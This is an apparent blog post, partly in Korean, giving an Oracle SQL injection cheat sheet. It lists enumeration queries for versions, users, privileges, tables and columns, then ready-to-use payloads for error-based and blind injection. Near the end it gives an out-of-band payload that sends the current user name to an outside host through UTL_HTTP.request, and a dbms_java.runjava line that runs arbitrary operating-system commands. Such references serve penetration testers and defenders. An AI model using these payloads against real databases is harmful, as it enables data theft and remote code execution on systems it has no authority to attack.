---
layout: post
title: "Oracle SQL Injection Cheat Sheet"
description: "-"
date: 2016-03-04
category: WebHacking
tags: [SQLi, Web]
comments: true
---
## Table of Contents
* [Basic](#basic)
	* [Database Version](#database-version)
	* [Database Name](#database-name)
	* [Database List](#database-list)
	* [User](#user)
	* [Database Privilege](#database-privilege)
	* [Table List](#table-list)
	* [Table List One Line](#table-list-one-line)
	* [Column List](#column-list)
	* [Host IP Address](#host-ip-address)
	* [Case](#case)
	* [Limit](#limit)
	* [Case](#case)
	* [Case](#case)
* [Error based SQLi](#error-based-sqli)
	* [Column Count](#column-count)
	* [Select](#select)
* [Blind SQLi](#blind-sqli)
* [Etc](#etc)
	* [Out-of-band SQLi](#out-of-band-sqli)
	* [dbms_java.runjava](#dbms_javarunjava-----)
- - - -
## Basic

### Database Version

![version](/assets/images/posts/2016/03/o.png)

```sql
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;
```

### Database Name

![Name](/assets/images/posts/2016/03/o1.png)

```sql
SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL; 
```

### Database List

![DB_LIST](/assets/images/posts/2016/03/o2.png)

```sql
SELECT DISTINCT owner FROM all_tables;
```

### User

![User](/assets/images/posts/2016/03/o3.png)

```sql
SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$;
```

### Database Privilege

![Privilege](/assets/images/posts/2016/03/o4.png)

```sql
SELECT * FROM session_privs; // current privs
SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP'; // priv, list a user's privs
SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
```

### Table List

![Table_List](/assets/images/posts/2016/03/o5.png)

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
```

### Table List One Line

![Table_List_One_Line](/assets/images/posts/2016/03/o6.png)

```sql
select rtrim(xmlagg(xmlelement(e, table_name || ',')).extract('//text()').extract('//text()') ,',') from all_tables;
```

### Column List

![Column_List](/assets/images/posts/2016/03/o7.png)

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = '테이블명';
SELECT column_name FROM all_tab_columns WHERE table_name = '테이블명' and owner = 'DB명';
```

### Host IP Address

![Host-IP](/assets/images/posts/2016/03/o8.png)

```sql
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual; // gets IP address
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual; // gets hostnames
```

### Case

![Case](/assets/images/posts/2016/03/o9.png)

```sql
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; // returns 1
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; // returns 2 
```

### Limit

![Limit](/assets/images/posts/2016/03/o10.png)

```sql
select * from (select rownum rnum, table.* from table) A where A.rnum between 5 and 13; 
```

### Error based SQLi

### Column Count

order by 구문을 통해 숫자를 늘려서 현재 SQL 구문에 컬럼이 몇개 인지 확인이 가능합니다.

에러가 발생할 경우 컬럼의 갯수를 초과하였기 때문에 해당 숫자의 -1개라고 생각할 수 있습니다.

![Column_Count](/assets/images/posts/2016/03/o11.png)

### Select

에러발생 시 해당 데이터가 출력되는 것을 이용하여 데이터를 확인할 수 있습니다.

![Select](/assets/images/posts/2016/03/o12.png)

```sql
1 and utl_inaddr.get_host_name((select global_name from global_name)) <>1--
```

## Blind SQLi

데이터를 직접 확인할 수 없고 True/False 기반으로 판별이 가능한 경우가 있습니다.

이때 데이터를 한 문자씩 가져와 ASCII 값으로 비교하여 데이터를 확인할 수 있습니다.

```sql
1 and ascii(substr((select user from dual),1,1))=83--
```

True 일 경우, 아래와 같이 값이 출력

![Blind-True](/assets/images/posts/2016/03/o13.png)

False 일 경우, 아래와 같이 값이 출력되지 않음

![Blind-False](/assets/images/posts/2016/03/o14.png)

## Etc

### Out-of-band SQLi

SQL Injection은 가능하나 데이터를 출력하거나 Blind SQLi를 사용할 수 없을 경우에 사용합니다.

특정 데이터를 특정 서버로 전달하여 데이터를 확인할 수 있습니다.

![Out-of-band](/assets/images/posts/2016/03/o15.png)

```sql
1 || UTL_HTTP.request('host'||(select user from dual)) 
```

### dbms_java.runjava 함수를 통한 임의의 명령어 실행

```sql
select dbms_java.runjava('com/sun/tools/script/shellMain -e "var p= java.lang.Runtime.getRuntime().exec("$cmd"),"')from dual
```